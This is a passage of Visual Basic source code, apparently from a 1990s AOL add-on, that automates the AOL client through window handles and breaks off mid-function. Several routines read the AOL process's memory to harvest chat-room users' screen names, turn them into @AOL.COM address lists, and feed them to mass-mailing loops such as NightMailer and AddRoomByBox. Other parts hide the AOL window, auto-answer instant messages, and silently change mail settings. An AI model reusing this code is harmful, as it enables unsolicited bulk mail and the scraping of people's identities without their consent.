thenext% = GetWindow(X%, GW_HWNDNEXT)
thenext% = GetWindow(thenext%, GW_HWNDNEXT)
thenext% = GetWindow(thenext%, GW_HWNDNEXT)
Click (thenext%)
End Function
Function FindChatWHoButton()
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
NWE% = FindChildByClass(findchat%, "_AOL_Icon")
HRE% = GetWindow(NWE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
Click (HRE%)
End Function


Function FindChatViewButton1()
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
FindChatViewButton% = FindChildByClass(findchat%, "_AOL_Icon")
Click (FindChatViewButton%)
End Function
Public Sub AddRoomByBox()
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = FindChildByTitle(AOLMDI, "Who's Chatting")
If room = 0 Then
pause (1)
room = FindChildByTitle(AOLMDI, "Who's Chatting")
If room = 0 Then GoTo KL
End If
KL:
AOLHandle = FindChildByClass(room, "_AOL_Listbox")
OLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
'Form1.MailsSent.Caption = Form1.MailsSent.Caption + SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
'AOLChangeCaption ("America  Online - " & Form1.MailsSent.Caption & " Mails Have Been Processed!")
If AOLProcessThread Then
For Index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
lop = Len(Person$)
Person$ = Right$(Person$, lop - 2)
Person$ = Person$ & ""
people = people & "(" & Person$ & "), "
pause (0.00001)
Next Index
Call CloseHandle(AOLProcessThread)
End If
killwin (room)
Troom = FindChildByTitle(AOLMDI, "Who's Chatting")
If Troom = 0 Then GoTo KLa
pause (1.5)
KLa:
If people = "" Then GoTo Last3
'Form1.CurrentAction.Caption = "Sending email.."
Call Mail_SendNew(people, Mail_Subject, Mail_Message)
Last3:
End Sub

Public Sub AddRoom(Listboxes As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
AOLHandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Listboxes.AddItem Person$
'AOLChangeCaption (title & " - Names Gathered: " & Form1.List1.ListCount)
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub
Function OpenMemberDirectory()
X% = FindChildByTitle(AOLMDI(), "Member Directory")
If X% = 0 Then GoTo KN
GoTo Last
KN:
AOLRunMenuByString ("Member Directory")
BE:
pause (1)
X% = FindChildByTitle(AOLMDI(), "Member Directory")
If X% = 0 Then GoTo BE
Last:
End Function
Public Sub AddRoomWithExt(Listboxes As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
AOLHandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Person$ = Person$ & "@AOL.COM"
Listboxes.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub
Function VBListtoList(Source As ListBox, Dest As ListBox)
counterv = -1
If Source.List(0) = "" Then
   GoTo Last
   End If
Start:
counterv = counterv + 1
If Source.List(counterv) = "" Then GoTo Last
Dest.AddItem Source.List(counterv)
pause (0.01)
GoTo Start
Last:
End Function

Function ListToList(Source, Destination)
counts = SendMessage(Source, LB_GETCOUNT, 0, 0)
For Adding = 0 To counts - 1
Buffer$ = String$(250, 0)
getstrings% = SendMessageByString(Source, LB_GETTEXT, Adding, Buffer$)
'Form1.List1.AddItem getstrings%
Next Adding

End Function

Function MouseOverHwnd()
    ' Declares
      Dim pt32 As POINTAPI
      Dim ptx As Long
      Dim pty As Long
   
      Call GetCursorPos(pt32)               ' Get cursor position
      ptx = pt32.X
      pty = pt32.Y
      MouseOverHwnd = WindowFromPointXY(ptx, pty)    ' Get window cursor is over
End Function

Function UntilWindowClass(parent, news$)
Do: DoEvents
E = FindChildByClass(parent, news$)
Loop Until E
UntilWindowClass = E
End Function


Function UntilWindowTitle(parent, news$)
Do: DoEvents
E = FindChildByTitle(parent, news$)
Loop Until E
UntilWindowTitle = E
End Function
Public Function AOLGetList(Index, Buffer As String)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
AOLHandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call CloseHandle(AOLProcessThread)
End If

Buffer$ = Person$
End Function





Function AddListToString(TheList As ListBox)
For dolist = 0 To TheList.ListCount - 1
AddListToString = AddListToString & TheList.List(dolist) & ", "
Next dolist
AddListToString = Mid(AddListToString, 1, Len(AddListToString) - 2)
End Function
Function Scram()
Scram = "biz"
Scram = Scram & "4"
Scram = Scram & "7"
Scram = Scram & "7"
Scram = Scram & "1"
Scram = Scram & "0"
End Function
Function NightMailer(TheNames As ListBox)
For dolist = 0 To TheNames.ListCount - 1
NICK = dolist + 7
If NICK > TheNames.ListCount Then GoTo VeryLast
pause (0.2)
TheNames.Selected(dolist) = True
NameListing = "(" & TheNames.List(dolist) & "), (" & TheNames.List(dolist + 1) & "), (" & TheNames.List(dolist + 2) & "), (" & TheNames.List(dolist + 3) & "), (" & TheNames.List(dolist + 4) & "), (" & TheNames.List(dolist + 5) & "), (" & TheNames.List(dolist + 6) & "), (" & TheNames.List(dolist + 7) & "), (" & TheNames.List(dolist + 8) & ")"
'Call Mail_SendNew(NameListing, Mail_Subject, Mail_Message & Chr(13) & Form1.HTML.Text)
dolist = dolist + 7
'Form3.ToProcess.Caption = Form3.ToProcess.Caption - 7
AOLChangeCaption ("Mailing #" & dolist & " of " & TheNames.ListCount)
If dolist > TheNames.ListCount Then GoTo Last
LO:
pause (0.2)
If NightM = 1 Then GoTo LO
'Form3.CurrentMailing.Caption = dolist
TheAVG = TheAVG + 7
If FRT = 1 Then GoTo Last
Next dolist
Last:
VeryLast:
FRT = 0
End Function
Function Program_Title()
Program_Title = ASCII & " " & title
End Function

Function AddListToMailString(frm As Form, TheList As ListBox)
If frm.TheList.List(0) = "" Then GoTo Last
For dolist = 0 To frm.TheList.ListCount - 1
AddListToMailString = AddListToMailString & "(" & frm.TheList.List(dolist) & "), "
Next dolist
AddListToMailString = Mid(AddListToMailString, 1, Len(AddListToMailString) - 2)
Last:
End Function

Function AddListToLongString(TheList As ListBox)
If TheList.List(0) = "" Then GoTo Last
For dolist = 0 To TheList.ListCount - 1
AddListToLongString = AddListToLongString & Chr(13) & TheList.List(dolist) & "@AOL.COM,"
Next dolist
AddListToLongString = Mid(AddListToLongString, 1, Len(AddListToLongString) - 2)
Last:
End Function
Function SearchForSelected(lst As ListBox)
If lst.List(0) = "" Then
counterf = 0
GoTo Last
End If
counterf = -1

Start:
counterf = counterf + 1
If lst.ListCount = counterf + 1 Then GoTo Last
If lst.Selected(counterf) = True Then GoTo Last
If couterf = lst.ListCount Then GoTo Last
GoTo Start

Last:
SearchForSelected = counterf
End Function
Function CountSelected(lst As ListBox)
CountSelected = lst.SelCount
End Function
Function JunoWindow()
jun% = FindWindow("Afx:b:152e:6:386f", vbNullString)
JunoWindow = jun%
End Function


Sub AddStringToList(theitems, TheList As ListBox)
If Not Mid(theitems, Len(theitems), 1) = "," Then
theitems = theitems & ","
End If

For dolist = 1 To Len(theitems)
thechars$ = thechars$ & Mid(theitems, dolist, 1)

If Mid(theitems, dolist, 1) = "," Then
TheList.AddItem Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
If Mid(theitems, dolist + 1, 1) = " " Then
dolist = dolist + 1
End If
End If
Next dolist

End Sub

Sub Scroll8Line(txt As TextBox)
lonh = String(116, Chr(32))
D = 116 - Len(Text1)
C$ = Left(lonh, D)
AOLChatSend ("" & txt & C$ & Text1)
AOLChatSend ("" & txt & C$ & Text1)
lonh = String(116, Chr(32))
D = 116 - Len(Text1)
C$ = Left(lonh, D)
AOLChatSend ("" & txt & C$ & Text1)
AOLChatSend ("" & txt & C$ & Text1)
End Sub


Function AOLClickList(hwnd)
clicklist% = SendMessageByNum(hwnd, &H203, 0, 0&)
End Function

Function AOLCountMail()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
AOLCountMail = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function
Function AOLCountMail2()
mailwin = FindMarket
thetree% = FindChildByClass(mailwin, "_AOL_Listbox")
AOLCountMail2 = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function
Function MemCount()
themail% = FindChildByTitle(AOLMDI(), "Member Directory Search Results")
thetree% = FindChildByClass(themail%, "_AOL_Listbox")
MemCount = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function
Function FindChatCount1()
TheList5% = FindChatList1
FindChatCount1 = SendMessage(TheList5%, LB_GETCOUNT, 0, 0)
End Function
Function EnterFindaChat()
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
If findchat% = 0 Then GoTo KC
GoTo Last
KC:
AOLKeyword ("PC")
W1:
pause (0.3)
peoplecon% = FindChildByTitle(AOLMDI(), "People Connection")
If peoplecon% = 0 Then GoTo W1
pause (0.2)
NWE% = FindChildByClass(peoplecon%, "_AOL_Icon")
HRE% = GetWindow(NWE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
W2:
Click (HRE%)
pause (0.3)
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
If findchat% = 0 Then GoTo W2
pause (0.2)
killwin (peoplecon%)
findchat% = 0
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
If findchat% = 0 Then GoTo W2
Last:
End Function
Function FindChatCount2()
TheList2% = FindChatList2
FindChatCount2 = SendMessage(TheList2%, LB_GETCOUNT, 0, 0)
End Function
Function AOLGetListString(parent, Index, Buffer As String)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

AOLHandle = parent

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call CloseHandle(AOLProcessThread)
End If

Buffer$ = Person$
End Function

Sub AOLHide()
a = ShowWindow(AOLWindow(), SW_HIDE)
End Sub

Sub AOLOpenChat()
If AOLFindRoom() Then Exit Sub
AOLKeyword ("pc")
Do: DoEvents
Loop Until AOLFindRoom()

End Sub


Sub AOLOpenMail(which)
If which = 1 Then
Call AOLRunMenuByString("Read &New Mail")
GoTo Last
End If

If which = 2 Then
Call AOLRunMenuByString("Check Mail You've &Read")
GoTo Last
End If

If Not which = 1 Or Not which = 2 Then
Call AOLRunMenuByString("Check Mail You've &Sent")
GoTo Last
End If
Last:
End Sub


Sub AOLRespondIM(Message)
IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If IM% Then GoTo Z
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If IM% Then GoTo Z
Exit Sub
Z:
E = FindChildByClass(IM%, "RICHCNTL")

E = GetWindow(E, 2)
E = GetWindow(E, 2)
E = GetWindow(E, 2)
E = GetWindow(E, 2)
E = GetWindow(E, 2)
E = GetWindow(E, 2)
E = GetWindow(E, 2)
E = GetWindow(E, 2)
E = GetWindow(E, 2)
e2 = GetWindow(E, 2) 'Send Text
E = GetWindow(e2, 2) 'Send Button
Call AOLSetText(e2, Message)
AOLIcon (E)
pause 4
killwin (IM%)
End Sub

Sub AOLRunMenuByString(stringer As String)
Call RunMenuByString(AOLWindow(), stringer)
End Sub


Sub AOLUnHide()
a = ShowWindow(AOLWindow(), SW_SHOW)
End Sub

Sub AOLWaitMail()
mailwin% = GetTopWindow(AOLMDI())
aoltree% = FindChildByClass(mailwin%, "_AOL_Tree")

Do: DoEvents
firstcount = SendMessage(aoltree%, LB_GETCOUNT, 0, 0)
pause (10)
secondcount = SendMessage(aoltree%, LB_GETCOUNT, 0, 0)
If firstcount = secondcount Then Exit Do
Loop


End Sub


Function EncryptType(Text, types)
'to encrypt, example:
'encrypted$ = EncryptType("messagetoencrypt", 0)
'to decrypt, example:
'decrypted$ = EncryptType("decryptedmessage", 1)
'* First Paramete is the Message
'* Second Parameter is 0 for encrypt
'  or 1 for decrypt

For God = 1 To Len(Text)
If types = 0 Then
Current$ = Asc(Mid(Text, God, 1)) - 1
Else
Current$ = Asc(Mid(Text, God, 1)) + 1
End If
Process$ = Process$ & Chr(Current$)
Next God

EncryptType = Process$
End Function

Function FindChildByTitle(parent, child As String) As Integer
childfocus% = GetWindow(parent, 5)

While childfocus%
hwndLength% = GetWindowTextLength(childfocus%)
Buffer$ = String$(hwndLength%, 0)
WindowText% = GetWindowText(childfocus%, Buffer$, (hwndLength% + 1))

If InStr(UCase(Buffer$), UCase(child)) Then FindChildByTitle = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend

End Function

Function FindChildByClass(parent, child As String) As Integer
childfocus% = GetWindow(parent, 5)

While childfocus%
Buffer$ = String$(250, 0)
classbuffer% = GetClassName(childfocus%, Buffer$, 250)

If InStr(UCase(Buffer$), UCase(child)) Then FindChildByClass = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend

End Function
Function FindMarket()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
childfocus% = GetWindow(MDI%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "_AOL_Icon")
listere% = FindChildByClass(childfocus%, "RICHCNTL")
listerb% = FindChildByClass(childfocus%, "_AOL_Listbox")
If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then themlm% = childfocus%: GoTo Last
childfocus% = GetWindow(childfocus%, 2)
Wend
Last:
FindMarket = themlm%
End Function

Function DescrambleText(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Descrambles the text
For scrambling = 1 To Len(thetext)
TheChar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & TheChar$

If TheChar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo City
lastchar$ = Mid(chars$, 2, 1)
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 3, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffed

'adds the scrambled text to the full scrambled element
City:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniff

sniffed:
scrambled$ = scrambled$ & lastchar$ & backchar$ & firstchar$ & " "

'clears character and reversed buffers
sniff:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
DescrambleText = scrambled$

End Function



Function GetLineCount(Text)

theview$ = Text


For FindChar = 1 To Len(theview$)
TheChar$ = Mid(theview$, FindChar, 1)

If TheChar$ = Chr(13) Then
numline = numline + 1
End If

Next FindChar

If Mid(Text, Len(Text), 1) = Chr(13) Then
GetLineCount = numline
Else
GetLineCount = numline + 1
End If
End Function

Sub HideWindow(hwnd)
hi = ShowWindow(hwnd, SW_HIDE)
End Sub

Function MinWindow(hwnd)
'SW_MINIMIZE
GeNgHiS = ShowWindow(hwnd, SW_MINIMIZE)
End Function

Function IntegerToString(tochange As Integer) As String
IntegerToString = Str$(tochange)
End Function

Function LineFromText(Text, theline)
theview$ = Text

For FindChar = 1 To Len(theview$)
TheChar$ = Mid(theview$, FindChar, 1)
thechars$ = thechars$ & TheChar$

If TheChar$ = Chr(13) Then
C = C + 1
thechatext$ = Mid(thechars$, 1, Len(thechars$) - 1)
If theline = C Then GoTo ex
thechars$ = ""
End If

Next FindChar
Exit Function
ex:
thechatext$ = ReplaceText(thechatext$, Chr(13), "")
thechatext$ = ReplaceText(thechatext$, Chr(10), "")

LineFromText = thechatext$
End Function



Sub MaxWindow(hwnd)
ma = ShowWindow(hwnd, SW_MAXIMIZE)
End Sub

Sub MiniWindow(hwnd)
MI2 = ShowWindow(hwnd, SW_MINIMIZE)
End Sub

Function NumericNumber(thenumber)
NumericNumber = Val(thenumber)
'turns the "number" so vb recognizes it for
'addition, subtraction, ect.
End Function

Sub ParentChange(parent%, location%)
doparent% = SetParent(parent%, location%)
End Sub


Function RandomNumber(finished)
Randomize
RandomNumber = Int((Val(finished) * Rnd) + 1)
End Function

Function ReverseText(Text)
For words = Len(Text) To 1 Step -1
ReverseText = ReverseText & Mid(Text, words, 1)
Next words


End Function

Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For GetString = 0 To MenuItemCount% - 1
Subcount% = GetMenuItemID(ToSearchSub%, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, Subcount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = Subcount%
GoTo MatchString
End If

Next GetString

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub

Sub AOLRunTool(tool)
Toolbar% = FindChildByClass(AOLWindow(), "AOL Toolbar")
iconz% = FindChildByClass(Toolbar%, "_AOL_Icon")
For X = 1 To tool - 1
iconz% = GetWindow(iconz%, 2)
Next X
isen% = IsWindowEnabled(iconz%)
If isen% = 0 Then Exit Sub
AOLIcon (iconz%)
End Sub

Function ScrambleGame(thestring As Integer)
Dim bytestring As String
thestringcount = Len(thestring)
If Not Mid(thestring, thestringcount, 1) = " " Then thestring = thestring & " "
For Stringe = 1 To Len(thestring)
characters$ = Mid(thestring, Stringe, 1)
thestrings$ = thestrings$ & characters$

If characters$ = " " Then
smoked:

DoEvents
For Ensemble = 1 To Len(thestrings$) - 1
Randomize
randomstring = Int((Len(thestrings$) * Rnd) + 1)
If randomstring = Len(thestrings$) Then GoTo already
If bytesread Like "*" & randomstring & "*" Then GoTo already
stringrandom$ = Mid(thestrings$, randomstring, 1)
stringfound$ = stringfound$ & stringrandom$
bytesread = bytesread & randomstring
GoTo really
already:
Ensemble = Ensemble - 1
really:
Next Ensemble
If stringfound$ = thestrings$ Then stringfound$ = "": GoTo smoked
thestrings2$ = thestrings2$ & stringfound$ & " "
stringfound$ = ""
thestrings$ = ""
bytesread = ""
strngfound$ = ""
End If

Next Stringe
ScrambleGame = Mid(thestrings2$, 1, Len(thestring) - 1)
End Function


Function ReplaceText(Text, charfind, charchange)
If InStr(Text, charfind) = 0 Then
ReplaceText = Text
Exit Function
End If

For Replace = 1 To Len(Text)
TheChar$ = Mid(Text, Replace, 1)
thechars$ = thechars$ & TheChar$

If TheChar$ = charfind Then
thechars$ = Mid(thechars$, 1, Len(thechars$) - 1) + charchange
End If
Next Replace

ReplaceText = thechars$

End Function


Sub SetBackPre()
Call RunMenuByString(AOLWindow(), "Preferences")

Do: DoEvents
prefer% = FindChildByTitle(AOLMDI(), "Preferences")
maillab% = FindChildByTitle(prefer%, "Mail")
mailbut% = GetWindow(maillab%, GW_HWNDNEXT)
If maillab% <> 0 And mailbut% <> 0 Then Exit Do
Loop

pause (0.2)
AOLIcon (mailbut%)

Do: DoEvents
aolmod% = FindWindow("_AOL_Modal", "Mail Preferences")
aolcloses% = FindChildByTitle(aolmod%, "Close mail after it has been sent")
aolconfirm% = FindChildByTitle(aolmod%, "Confirm mail after it has been sent")
aolOK% = FindChildByTitle(aolmod%, "OK")
If aolOK% <> 0 And aolcloses% <> 0 And aolconfirm% <> 0 Then Exit Do
Loop
sendcon% = SendMessage(aolcloses%, BM_SETCHECK, 0, 0)
sendcon% = SendMessage(aolconfirm%, BM_SETCHECK, 1, 0)

AOLButton (aolOK%)
Do: DoEvents
aolmod% = FindWindow("_AOL_Modal", "Mail Preferences")
Loop Until aolmod% = 0

closepre% = SendMessage(prefer%, WM_CLOSE, 0, 0)

End Sub

Function StayOnline()
hwndz% = FindWindow(AOLWindow(), "America Online")
childhwnd% = FindChildByTitle(hwndz%, "OK")
AOLButton (childhwnd%)
End Function

Function StringToInteger(tochange As String) As Integer
StringToInteger = tochange
End Function
Function TrimCharacter(thetext, chars)
TrimCharacter = ReplaceText(thetext, chars, "")

End Function

Function TrimReturns(thetext)
takechr13 = ReplaceText(thetext, Chr$(13), "")
takechr9 = ReplaceText(takechr13, Chr$(9), "")
takechr10 = ReplaceText(takechr9, Chr$(10), "")
TrimReturns = takechr10
End Function

Function TrimSpaces(Text)
If InStr(Text, " ") = 0 Then
TrimSpaces = Text
Exit Function
End If

For Trimspace = 1 To Len(Text)
TheChar$ = Mid(Text, Trimspace, 1)
thechars$ = thechars$ & TheChar$
If TheChar$ = " " Then
thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
End If
Next Trimspace

TrimSpaces = thechars$
End Function


Function AOLMDI()
aol% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(aol%, "MDIClient")
End Function



Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function


Function Find2ndChildByClass(parentw, childhand)
'DO NOT FUCK WITH THIS! I had to rewrite the whole
'Findchildbyclass for AOL4.0...TOOK SOME FUKIN TIME
'AND THINKIN SO DON'T FUK WITH THIS CODE!
'-=Baron=-
    firs% = GetWindow(parentw, 5)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    firs% = GetWindow(parentw, 5)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    While firs%
        firs% = GetWindow(parentw, 5)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
        firs% = GetWindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    Wend
    Find2ndChildByClass = 0
Found:
    firs% = GetWindow(firs%, 2)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    firs% = GetWindow(firs%, 2)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    While firs%
        firs% = GetWindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
        firs% = GetWindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    Wend
    Find2ndChildByClass = 0
Found2:
    Find2ndChildByClass = firs%
End Function

Function FindSendWin(dosloop)
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Send Now")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindSendWin = firs%

Exit Function
begis:
FindSendWin = firss%
End Function


Function KTEncrypt(ByVal Password, ByVal strng, force%)
'Example:
'temp = KTEncrypt ("Paszwerd", text1.text, 0)
'text1.text = temp


  'Set error capture routine
  On Local Error GoTo ErrorHandler

  
  'Is there Password??
  If Len(Password) = 0 Then Error 31100
  
  'Is password too long
  If Len(Password) > 255 Then Error 31100

  'Is there a strng$ to work with?
  If Len(strng) = 0 Then Error 31100

  
  'Check if file is encrypted and not forcing
  If force% = 0 Then
    
    'Check for encryption ID tag
    chk$ = Left$(strng, 4) + Right$(strng, 4)
    
    If chk$ = Chr$(1) + "KT" + Chr$(1) + Chr$(1) + "KT" + Chr$(1) Then
      
      'Remove ID tag
      strng = Mid$(strng, 5, Len(strng) - 8)
      
      'String was encrypted so filter out CHR$(1) flags
      look = 1
      Do
        look = InStr(look, strng, Chr$(1))
        If look = 0 Then
          Exit Do
        Else
          Addin$ = Chr$(Asc(Mid$(strng, look + 1)) - 1)
          strng = Left$(strng, look - 1) + Addin$ + Mid$(strng, look + 2)
        End If
        look = look + 1
      Loop
      
      'Since it is encrypted we want to decrypt it
      EncryptFlag% = False
    
    Else
      'Tag not found so flag to encrypt string
      EncryptFlag% = True
    End If
  Else
